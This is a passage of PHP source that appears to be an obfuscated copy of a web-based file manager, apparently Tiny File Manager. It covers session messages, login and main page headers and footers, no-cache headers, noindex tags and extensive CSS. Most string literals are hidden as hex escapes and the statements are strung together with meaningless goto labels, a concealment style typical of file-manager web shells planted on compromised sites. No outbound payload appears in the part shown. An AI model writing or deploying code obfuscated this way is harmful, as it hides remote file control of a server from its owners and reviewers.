    if (isset($_SESSION[FM_SESSION_ID]["\x6D\145\x73\163\x61\147\x65"])) {
        $class = isset($_SESSION[FM_SESSION_ID]["\x73\164\x61\164\x75\163"]) ? $_SESSION[FM_SESSION_ID]["\x73\164\x61\164\x75\163"] : "\x6F\153";
        echo "\x3C\160\x20\143\x6C\141\x73\163\x3D\042\x6D\145\x73\163\x61\147\x65\040" . $class . "\x22\076" . $_SESSION[FM_SESSION_ID]["\x6D\145\x73\163\x61\147\x65"] . "\x3C\057\x70\076";
        unset($_SESSION[FM_SESSION_ID]["\x6D\145\x73\163\x61\147\x65"]);
        unset($_SESSION[FM_SESSION_ID]["\x73\164\x61\164\x75\163"]);
    }
}

function fm_show_header_login()
{
$sprites_ver = "\x32\060\x31\066\x30\063\x31\065";
header("\x43\157\x6E\164\x65\156\x74\055\x54\171\x70\145\x3A\040\x74\145\x78\164\x2F\150\x74\155\x6C\073\x20\143\x68\141\x72\163\x65\164\x3D\165\x74\146\x2D\070");
header("\x45\170\x70\151\x72\145\x73\072\x20\123\x61\164\x2C\040\x32\066\x20\112\x75\154\x20\061\x39\071\x37\040\x30\065\x3A\060\x30\072\x30\060\x20\107\x4D\124");
header("\x43\141\x63\150\x65\055\x43\157\x6E\164\x72\157\x6C\072\x20\156\x6F\055\x73\164\x6F\162\x65\054\x20\156\x6F\055\x63\141\x63\150\x65\054\x20\155\x75\163\x74\055\x72\145\x76\141\x6C\151\x64\141\x74\145\x2C\040\x70\157\x73\164\x2D\143\x68\145\x63\153\x3D\060\x2C\040\x70\162\x65\055\x63\150\x65\143\x6B\075\x30");
header("\x50\162\x61\147\x6D\141\x3A\040\x6E\157\x2D\143\x61\143\x68\145");

global $lang, $root_url, $favicon_path; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php goto opet_1d255; opet_1d255: if($favicon_path) { echo "\x3C\154\x69\156\x6B\040\x72\145\x6C\075\x22\151\x63\157\x6E\042\x20\150\x72\145\x66\075\x22".fm_enc($favicon_path)."\x22\040\x74\171\x70\145\x3D\042\x69\155\x61\147\x65\057\x70\156\x67\042\x3E"; } ?>
    <title><?php goto opet_1d257; opet_1d257: echo fm_enc(APP_TITLE) ?></title>
    <?php goto opet_1d25b; opet_1d25b: print_external("\x70\162\x65\055\x6A\163\x64\145\x6C\151\x76\162"); ?>
    <?php goto opet_1d25f; opet_1d25f: print_external("\x63\163\x73\055\x62\157\x6F\164\x73\164\x72\141\x70"); ?>
    <style>
        body.fm-login-page{ background-color:#171717;font-size:14px;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='905' height='452.5' viewBox='0 0 1600 800'%3E%3Cpath fill='%23FF7' d='M1102.5 734.8c2.5-1.2 24.8-8.6 25.6-7.5.5.7-3.9 23.8-4.6 24.5C1123.3 752.1 1107.5 739.5 1102.5 734.8zM1226.3 229.1c0-.1-4.9-9.4-7-14.2-.1-.3-.3-1.1-.4-1.6-.1-.4-.3-.7-.6-.9-.3-.2-.6-.1-.8.1l-13.1 12.3c0 0 0 0 0 0-.2.2-.3.5-.4.8 0 .3 0 .7.2 1 .1.1 1.4 2.5 2.1 3.6 2.4 3.7 6.5 12.1 6.5 12.2.2.3.4.5.7.6.3 0 .5-.1.7-.3 0 0 1.8-2.5 2.7-3.6 1.5-1.6 3-3.2 4.6-4.7 1.2-1.2 1.6-1.4 2.1-1.6.5-.3 1.1-.5 2.5-1.9C1226.5 230.4 1226.6 229.6 1226.3 229.1zM33 770.3C33 770.3 33 770.3 33 770.3c0-.7-.5-1.2-1.2-1.2-.1 0-.3 0-.4.1-1.6.2-14.3.1-22.2 0-.3 0-.6.1-.9.4-.2.2-.4.5-.4.9 0 .2 0 4.9.1 5.9l.4 13.6c0 .3.2.6.4.9.2.2.5.3.8.3 0 0 .1 0 .1 0 7.3-.7 14.7-.9 22-.6.3 0 .7-.1.9-.3.2-.2.4-.6.4-.9C32.9 783.3 32.9 776.2 33 770.3z'/%3E%3Cpath fill='%235ff' d='M171.1 383.4c1.3-2.5 14.3-22 15.6-21.6.8.3 11.5 21.2 11.5 22.1C198.1 384.2 177.9 384 171.1 383.4zM596.4 711.8c-.1-.1-6.7-8.2-9.7-12.5-.2-.3-.5-1-.7-1.5-.2-.4-.4-.7-.7-.8-.3-.1-.6 0-.8.3L574 712c0 0 0 0 0 0-.2.2-.2.5-.2.9 0 .3.2.7.4.9.1.1 1.8 2.2 2.8 3.1 3.1 3.1 8.8 10.5 8.9 10.6.2.3.5.4.8.4.3 0 .5-.2.6-.5 0 0 1.2-2.8 2-4.1 1.1-1.9 2.3-3.7 3.5-5.5.9-1.4 1.3-1.7 1.7-2 .5-.4 1-.7 2.1-2.4C596.9 713.1 596.8 712.3 596.4 711.8zM727.5 179.9C727.5 179.9 727.5 179.9 727.5 179.9c.6.2 1.3-.2 1.4-.8 0-.1 0-.2 0-.4.2-1.4 2.8-12.6 4.5-19.5.1-.3 0-.6-.2-.8-.2-.3-.5-.4-.8-.5-.2 0-4.7-1.1-5.7-1.3l-13.4-2.7c-.3-.1-.7 0-.9.2-.2.2-.4.4-.5.6 0 0 0 .1 0 .1-.8 6.5-2.2 13.1-3.9 19.4-.1.3 0 .6.2.9.2.3.5.4.8.5C714.8 176.9 721.7 178.5 727.5 179.9zM728.5 178.1c-.1-.1-.2-.2-.4-.2C728.3 177.9 728.4 178 728.5 178.1z'/%3E%3Cg fill='%23FFF'%3E%3Cpath d='M699.6 472.7c-1.5 0-2.8-.8-3.5-2.3-.8-1.9 0-4.2 1.9-5 3.7-1.6 6.8-4.7 8.4-8.5 1.6-3.8 1.7-8.1.2-11.9-.3-.9-.8-1.8-1.2-2.8-.8-1.7-1.8-3.7-2.3-5.9-.9-4.1-.2-8.6 2-12.8 1.7-3.1 4.1-6.1 7.6-9.1 1.6-1.4 4-1.2 5.3.4 1.4 1.6 1.2 4-.4 5.3-2.8 2.5-4.7 4.7-5.9 7-1.4 2.6-1.9 5.3-1.3 7.6.3 1.4 1 2.8 1.7 4.3.5 1.1 1 2.2 1.5 3.3 2.1 5.6 2 12-.3 17.6-2.3 5.5-6.8 10.1-12.3 12.5C700.6 472.6 700.1 472.7 699.6 472.7zM740.4 421.4c1.5-.2 3 .5 3.8 1.9 1.1 1.8.4 4.2-1.4 5.3-3.7 2.1-6.4 5.6-7.6 9.5-1.2 4-.8 8.4 1.1 12.1.4.9 1 1.7 1.6 2.7 1 1.7 2.2 3.5 3 5.7 1.4 4 1.2 8.7-.6 13.2-1.4 3.4-3.5 6.6-6.8 10.1-1.5 1.6-3.9 1.7-5.5.2-1.6-1.4-1.7-3.9-.2-5.4 2.6-2.8 4.3-5.3 5.3-7.7 1.1-2.8 1.3-5.6.5-7.9-.5-1.3-1.3-2.7-2.2-4.1-.6-1-1.3-2.1-1.9-3.2-2.8-5.4-3.4-11.9-1.7-17.8 1.8-5.9 5.8-11 11.2-14C739.4 421.6 739.9 421.4 740.4 421.4zM261.3 590.9c5.7 6.8 9 15.7 9.4 22.4.5 7.3-2.4 16.4-10.2 20.4-3 1.5-6.7 2.2-11.2 2.2-7.9-.1-12.9-2.9-15.4-8.4-2.1-4.7-2.3-11.4 1.8-15.9 3.2-3.5 7.8-4.1 11.2-1.6 1.2.9 1.5 2.7.6 3.9-.9 1.2-2.7 1.5-3.9.6-1.8-1.3-3.6.6-3.8.8-2.4 2.6-2.1 7-.8 9.9 1.5 3.4 4.7 5 10.4 5.1 3.6 0 6.4-.5 8.6-1.6 4.7-2.4 7.7-8.6 7.2-15-.5-7.3-5.3-18.2-13-23.9-4.2-3.1-8.5-4.1-12.9-3.1-3.1.7-6.2 2.4-9.7 5-6.6 5.1-11.7 11.8-14.2 19-2.7 7.7-2.1 15.8 1.9 23.9.7 1.4.1 3.1-1.3 3.7-1.4.7-3.1.1-3.7-1.3-4.6-9.4-5.4-19.2-2.2-28.2 2.9-8.2 8.6-15.9 16.1-21.6 4.1-3.1 8-5.1 11.8-6 6-1.4 12 0 17.5 4C257.6 586.9 259.6 588.8 261.3 590.9z'/%3E%3Ccircle cx='1013.7' cy='153.9' r='7.1'/%3E%3Ccircle cx='1024.3' cy='132.1' r='7.1'/%3E%3Ccircle cx='1037.3' cy='148.9' r='7.1'/%3E%3Cpath d='M1508.7 297.2c-4.8-5.4-9.7-10.8-14.8-16.2 5.6-5.6 11.1-11.5 15.6-18.2 1.2-1.7.7-4.1-1-5.2-1.7-1.2-4.1-.7-5.2 1-4.2 6.2-9.1 11.6-14.5 16.9-4.8-5-9.7-10-14.7-14.9-1.5-1.5-3.9-1.5-5.3 0-1.5 1.5-1.5 3.9 0 5.3 4.9 4.8 9.7 9.8 14.5 14.8-1.1 1.1-2.3 2.2-3.5 3.2-4.1 3.8-8.4 7.8-12.4 12-1.4 1.5-1.4 3.8 0 5.3 0 0 0 0 0 0 1.5 1.4 3.9 1.4 5.3-.1 3.9-4 8.1-7.9 12.1-11.7 1.2-1.1 2.3-2.2 3.5-3.3 4.9 5.3 9.8 10.6 14.6 15.9.1.1.1.1.2.2 1.4 1.4 3.7 1.5 5.2.2C1510 301.2 1510.1 298.8 1508.7 297.2zM327.6 248.6l-.4-2.6c-1.5-11.1-2.2-23.2-2.3-37 0-5.5 0-11.5.2-18.5 0-.7 0-1.5 0-2.3 0-5 0-11.2 3.9-13.5 2.2-1.3 5.1-1 8.5.9 5.7 3.1 13.2 8.7 17.5 14.9 5.5 7.8 7.3 16.9 5 25.7-3.2 12.3-15 31-30 32.1L327.6 248.6zM332.1 179.2c-.2 0-.3 0-.4.1-.1.1-.7.5-1.1 2.7-.3 1.9-.3 4.2-.3 6.3 0 .8 0 1.7 0 2.4-.2 6.9-.2 12.8-.2 18.3.1 12.5.7 23.5 2 33.7 11-2.7 20.4-18.1 23-27.8 1.9-7.2.4-14.8-4.2-21.3l0 0C347 188.1 340 183 335 180.3 333.6 179.5 332.6 179.2 332.1 179.2zM516.3 60.8c-.1 0-.2 0-.4-.1-2.4-.7-4-.9-6.7-.7-.7 0-1.3-.5-1.4-1.2 0-.7.5-1.3 1.2-1.4 3.1-.2 4.9 0 7.6.8.7.2 1.1.9.9 1.6C517.3 60.4 516.8 60.8 516.3 60.8zM506.1 70.5c-.5 0-1-.3-1.2-.8-.8-2.1-1.2-4.3-1.3-6.6 0-.7.5-1.3 1.2-1.3.7 0 1.3.5 1.3 1.2.1 2 .5 3.9 1.1 5.8.2.7-.1 1.4-.8 1.6C506.4 70.5 506.2 70.5 506.1 70.5zM494.1 64.4c-.4 0-.8-.2-1-.5-.4-.6-.3-1.4.2-1.8 1.8-1.4 3.7-2.6 5.8-3.6.6-.3 1.4 0 1.7.6.3.6 0 1.4-.6 1.7-1.9.9-3.7 2-5.3 3.3C494.7 64.3 494.4 64.4 494.1 64.4zM500.5 55.3c-.5 0-.9-.3-1.2-.7-.5-1-1.2-1.9-2.4-3.4-.3-.4-.7-.9-1.1-1.4-.4-.6-.3-1.4.2-1.8.6-.4 1.4-.3 1.8.2.4.5.8 1 1.1 1.4 1.3 1.6 2.1 2.6 2.7 3.9.3.6 0 1.4-.6 1.7C500.9 55.3 500.7 55.3 500.5 55.3zM506.7 55c-.3 0-.5-.1-.8-.2-.6-.4-.7-1.2-.3-1.8 1.2-1.7 2.3-3.4 3.3-5.2.3-.6 1.1-.9 1.7-.5.6.3.9 1.1.5 1.7-1 1.9-2.2 3.8-3.5 5.6C507.4 54.8 507.1 55 506.7 55zM1029.3 382.8c-.1 0-.2 0-.4-.1-2.4-.7-4-.9-6.7-.7-.7 0-1.3-.5-1.4-1.2 0-.7.5-1.3 1.2-1.4 3.1-.2 4.9 0 7.6.8.7.2 1.1.9.9 1.6C1030.3 382.4 1029.8 382.8 1029.3 382.8zM1019.1 392.5c-.5 0-1-.3-1.2-.8-.8-2.1-1.2-4.3-1.3-6.6 0-.7.5-1.3 1.2-1.3.7 0 1.3.5 1.3 1.2.1 2 .5 3.9 1.1 5.8.2.7-.1 1.4-.8 1.6C1019.4 392.5 1019.2 392.5 1019.1 392.5zM1007.1 386.4c-.4 0-.8-.2-1-.5-.4-.6-.3-1.4.2-1.8 1.8-1.4 3.7-2.6 5.8-3.6.6-.3 1.4 0 1.7.6.3.6 0 1.4-.6 1.7-1.9.9-3.7 2-5.3 3.3C1007.7 386.3 1007.4 386.4 1007.1 386.4zM1013.5 377.3c-.5 0-.9-.3-1.2-.7-.5-1-1.2-1.9-2.4-3.4-.3-.4-.7-.9-1.1-1.4-.4-.6-.3-1.4.2-1.8.6-.4 1.4-.3 1.8.2.4.5.8 1 1.1 1.4 1.3 1.6 2.1 2.6 2.7 3.9.3.6 0 1.4-.6 1.7C1013.9 377.3 1013.7 377.3 1013.5 377.3zM1019.7 377c-.3 0-.5-.1-.8-.2-.6-.4-.7-1.2-.3-1.8 1.2-1.7 2.3-3.4 3.3-5.2.3-.6 1.1-.9 1.7-.5.6.3.9 1.1.5 1.7-1 1.9-2.2 3.8-3.5 5.6C1020.4 376.8 1020.1 377 1019.7 377zM1329.7 573.4c-1.4 0-2.9-.2-4.5-.7-8.4-2.7-16.6-12.7-18.7-20-.4-1.4-.7-2.9-.9-4.4-8.1 3.3-15.5 10.6-15.4 21 0 1.5-1.2 2.7-2.7 2.8 0 0 0 0 0 0-1.5 0-2.7-1.2-2.7-2.7-.1-6.7 2.4-12.9 7-18 3.6-4 8.4-7.1 13.7-8.8.5-6.5 3.1-12.9 7.4-17.4 7-7.4 18.2-8.9 27.3-10.1l.7-.1c1.5-.2 2.9.9 3.1 2.3.2 1.5-.9 2.9-2.3 3.1l-.7.1c-8.6 1.2-18.4 2.5-24 8.4-3 3.2-5 7.7-5.7 12.4 7.9-1 17.7 1.3 24.3 5.7 4.3 2.9 7.1 7.8 7.2 12.7.2 4.3-1.7 8.3-5.2 11.1C1335.2 572.4 1332.6 573.4 1329.7 573.4zM1311 546.7c.1 1.5.4 3 .8 4.4 1.7 5.8 8.7 14.2 15.1 16.3 2.8.9 5.1.5 7.2-1.1 2.7-2.1 3.2-4.8 3.1-6.6-.1-3.2-2-6.4-4.8-8.3C1326.7 547.5 1317.7 545.6 1311 546.7z'/%3E%3C/g%3E%3C/svg%3E");background-attachment: fixed;}
        .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
        .fm-login-page .brand img{ width:100%}
        .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
        .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
        .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
        .fm-login-page .form-control{ border-width:2.3px}
        .fm-login-page .form-group label{ width:100%}
        .fm-login-page .btn.btn-block{ padding:12px 10px}
        .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
        @media screen and (max-width:425px){
            .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
        }
        @media screen and (max-width:320px){
            .fm-login-page .card.fat{ padding:0}
            .fm-login-page .card.fat .card-body{ padding:15px}
        }
        .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
        .message.ok{ border-color:green;color:green}
        .message.error{ border-color:red;color:red}
        .message.alert{ border-color:orange;color:orange}
        body.fm-login-page.theme-dark {background-color: #171717;}
        .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
    </style>
</head>
<body class="fm-login-page <?php goto opet_1d265; opet_1d265: echo (FM_THEME == "\x64\141\x72\153") ? "\x74\150\x65\155\x65\055\x64\141\x72\153" : ""; ?>">
<div id="wrapper" class="container-fluid">

    <?php goto opet_1d26c; opet_1d26c: }
    function fm_show_footer_login()
    { ?>
</div>
<?php goto opet_1d271; opet_1d271: print_external("\x6A\163\x2D\152\x71\165\x65\162\x79"); ?>
<?php goto opet_1d275; opet_1d275: print_external("\x6A\163\x2D\142\x6F\157\x74\163\x74\162\x61\160"); ?>
</body>
</html>
<?php goto opet_1d2ad; opet_1d2ad: }

function fm_show_header()
{
$sprites_ver = "\x32\060\x31\066\x30\063\x31\065";
header("\x43\157\x6E\164\x65\156\x74\055\x54\171\x70\145\x3A\040\x74\145\x78\164\x2F\150\x74\155\x6C\073\x20\143\x68\141\x72\163\x65\164\x3D\165\x74\146\x2D\070");
header("\x45\170\x70\151\x72\145\x73\072\x20\123\x61\164\x2C\040\x32\066\x20\112\x75\154\x20\061\x39\071\x37\040\x30\065\x3A\060\x30\072\x30\060\x20\107\x4D\124");
header("\x43\141\x63\150\x65\055\x43\157\x6E\164\x72\157\x6C\072\x20\156\x6F\055\x73\164\x6F\162\x65\054\x20\156\x6F\055\x63\141\x63\150\x65\054\x20\155\x75\163\x74\055\x72\145\x76\141\x6C\151\x64\141\x74\145\x2C\040\x70\157\x73\164\x2D\143\x68\145\x63\153\x3D\060\x2C\040\x70\162\x65\055\x63\150\x65\143\x6B\075\x30");
header("\x50\162\x61\147\x6D\141\x3A\040\x6E\157\x2D\143\x61\143\x68\145");

global $lang, $root_url, $sticky_navbar, $favicon_path;
$isStickyNavBar = $sticky_navbar ? "\x6E\141\x76\142\x61\162\x2D\146\x69\170\x65\144" : "\x6E\141\x76\142\x61\162\x2D\156\x6F\162\x6D\141\x6C"; ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php goto opet_1d2b8; opet_1d2b8: if($favicon_path) { echo "\x3C\154\x69\156\x6B\040\x72\145\x6C\075\x22\151\x63\157\x6E\042\x20\150\x72\145\x66\075\x22".fm_enc($favicon_path)."\x22\040\x74\171\x70\145\x3D\042\x69\155\x61\147\x65\057\x70\156\x67\042\x3E"; } ?>
    <title><?php goto opet_1d2ba; opet_1d2ba: echo fm_enc(APP_TITLE) ?></title>
    <?php goto opet_1d2be; opet_1d2be: print_external("\x70\162\x65\055\x6A\163\x64\145\x6C\151\x76\162"); ?>
    <?php goto opet_1d2c2; opet_1d2c2: print_external("\x70\162\x65\055\x63\154\x6F\165\x64\146\x6C\141\x72\145"); ?>
    <?php goto opet_1d2c7; opet_1d2c7: print_external("\x63\163\x73\055\x62\157\x6F\164\x73\164\x72\141\x70"); ?>
    <?php goto opet_1d2cc; opet_1d2cc: print_external("\x63\163\x73\055\x66\157\x6E\164\x2D\141\x77\145\x73\157\x6D\145"); ?>
    <?php goto opet_1d2ce; opet_1d2ce: if (FM_USE_HIGHLIGHTJS && isset($_GET["\x76\151\x65\167"])): ?>
    <?php goto opet_1d2d3; opet_1d2d3: print_external("\x63\163\x73\055\x68\151\x67\150\x6C\151\x67\150\x74\152\x73"); ?>
    <?php goto opet_1d2d4; opet_1d2d4: endif; ?>
    <script type="text/javascript">window.csrf = '<?php goto opet_1d2d7; opet_1d2d7: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>';</script>
    <style>
        html { -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; height: 100%; scroll-behavior: smooth;}
        *,*::before,*::after { box-sizing: border-box;}
        body { font-size:15px; color:#222;background:#F7F7F7; }
        body.navbar-fixed { margin-top:55px; }
        a, a:hover, a:visited, a:focus { text-decoration:none !important; }
        .filename, td, th { white-space:nowrap  }
        .navbar-brand { font-weight:bold; }
        .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
        .nav-item.avatar a > i { font-size:15px; }
        .nav-item.avatar .dropdown-menu a { font-size:13px; }
        #search-addon { font-size:12px;border-right-width:0; }
        .brl-0 { background:transparent;border-left:0; border-top-left-radius: 0; border-bottom-left-radius: 0; }
        .brr-0 { border-top-right-radius: 0; border-bottom-right-radius: 0; }
        .bread-crumb { color:#cccccc;font-style:normal; }
        #main-table { transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1),width 0s .25s;}
        #main-table .filename a { color:#222222; }
        .table td, .table th { vertical-align:middle !important; }
        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; display: flex;align-items: center; justify-content: center; }
        .table-sm td, .table-sm th { padding:.4rem; }
        .table-bordered td, .table-bordered th { border:1px solid #ff0000; }
        .hidden { display:none  }
        pre.with-hljs { padding:0; overflow: hidden;  }
        pre.with-hljs code { margin:0;border:0;overflow:scroll;  }
        code.maxheight, pre.maxheight { max-height:512px  }
        .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
        .fa.fa-home { font-size:1.3em;vertical-align:bottom  }
        .path { margin-bottom:10px  }
        form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
        .right { text-align:right  }
        .center, .close, .login-form, .preview-img-container { text-align:center  }
        .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
        .message.ok { border-color:green;color:green  }
        .message.error { border-color:red;color:red  }
        .message.alert { border-color:orange;color:orange  }
        .preview-img { max-width:100%;max-height:80vh;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);cursor:zoom-in }
        input#preview-img-zoomCheck[type=checkbox] { display:none }
        input#preview-img-zoomCheck[type=checkbox]:checked ~ label > img { max-width:none;max-height:none;cursor:zoom-out }
        .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px 4px;border-radius:3px; }
        .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
        .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
        .compact-table { border:0;width:auto  }
        .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
        .compact-table tr:hover td { background-color:#fff  }
        .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
        .break-word { word-wrap:break-word;margin-left:30px  }
        .break-word.float-left a { color:#7d7d7d  }
        .break-word + .float-right { padding-right:30px;position:relative  }
        .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
        #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
        @media (max-width:481px) {
            #editor { top:150px; }
        }
        #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
        .btn-2 { padding:4px 10px;font-size:small; }
        li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
        li.folder:before { content:"\f114" }
        i.fa.fa-folder-o { color:#0157b3 }
        i.fa.fa-picture-o { color:#26b99a }
        i.fa.fa-file-archive-o { color:#da7d7d }
        .btn-2 i.fa.fa-file-archive-o { color:inherit }
        i.fa.fa-css3 { color:#f36fa0 }
        i.fa.fa-file-code-o { color:#007bff }
        i.fa.fa-code { color:#cc4b4c }
        i.fa.fa-file-text-o { color:#0096e6 }
        i.fa.fa-html5 { color:#d75e72 }
        i.fa.fa-file-excel-o { color:#09c55d }
        i.fa.fa-file-powerpoint-o { color:#f6712e }
        i.go-back { font-size:1.2em;color:#007bff; }
        .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
        .dataTables_filter { display:none; }
        table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
        table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
        table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
        .footer-action li { margin-bottom:10px; }
        .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
        hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
        #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
        @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        @keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        #main-table span.badge { border-bottom:2px solid #f8f9fa }
        #main-table span.badge:nth-child(1) { border-color:#df4227 }
        #main-table span.badge:nth-child(2) { border-color:#f8b600 }
        #main-table span.badge:nth-child(3) { border-color:#00bd60 }
        #main-table span.badge:nth-child(4) { border-color:#4581ff }
        #main-table span.badge:nth-child(5) { border-color:#ac68fc }
        #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6 { padding:0; }
        }
        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
        .lds-facebook { display:none;position:relative;width:64px;height:64px }
        .lds-facebook div,.lds-facebook.show-me { display:inline-block }
        .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
        .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
        .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
        .lds-facebook div:nth-child(3) { left:45px;animation-delay:0s }
        @keyframes lds-facebook { 0% { top:6px;height:51px }
        100%,50% { top:19px;height:26px }
        }
        ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
        ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
        .c-preview-img { max-width: 300px; }
        .border-radius-0 { border-radius: 0; }
        .float-right { float: right; }
        .table-hover>tbody>tr:hover>td:first-child { border-left: 1px solid #1b77fd; }
        #main-table tr.even { background-color: #F8F9Fa; }
        .filename>a>i {margin-right: 3px;}
    </style>
    <?php goto opet_1d2db; opet_1d2db: if (FM_THEME == "\x64\141\x72\153"): ?>
        <style>
            :root {
                --bs-bg-opacity: 1;
                --bg-color: #f3daa6;
                --bs-dark-rgb: 28, 36, 41 !important;
                --bs-bg-opacity: 1;
            }
            .table-dark { --bs-table-bg: 28, 36, 41 !important; }
            .btn-primary { --bs-btn-bg: #26566c; --bs-btn-border-color: #26566c; }
            body.theme-dark { background-image: linear-gradient(90deg, #1c2429, #263238); color: #00b1ff; }
            .list-group .list-group-item { background: #343a40; }
            .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #00b1ff; }
            a, a:hover, a:visited, a:active, #main-table .filename a, i.fa.fa-folder-o, i.go-back { color: var(--bg-color); }
            ul#search-wrapper li:nth-child(odd) { background: #212a2f; }
            .theme-dark .btn-outline-primary { color: #b8e59c; border-color: #b8e59c; }
            .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #2d4121;}
            .theme-dark input.form-control { background-color: #101518; color: #00b1ff; }
            .theme-dark .dropzone { background: transparent; }
            .theme-dark .inline-actions > a > i { background: #79755e; }
            .theme-dark .text-white { color: #00b1ff !important; }
            .theme-dark .table-bordered td, .table-bordered th { border-color: #ab00ff; }
            .theme-dark .table-bordered td .custom-control-input, .theme-dark .table-bordered th .custom-control-input { opacity: 0.678; }
            .message { background-color: #212529; }
            .compact-table tr:hover td { background-color: #3d3d3d; }
            #main-table tr.even { background-color: #21292f; }
            form.dropzone { border-color: #79755e; }
        </style>
    <?php goto opet_1d2df; opet_1d2df: endif; ?>
</head>
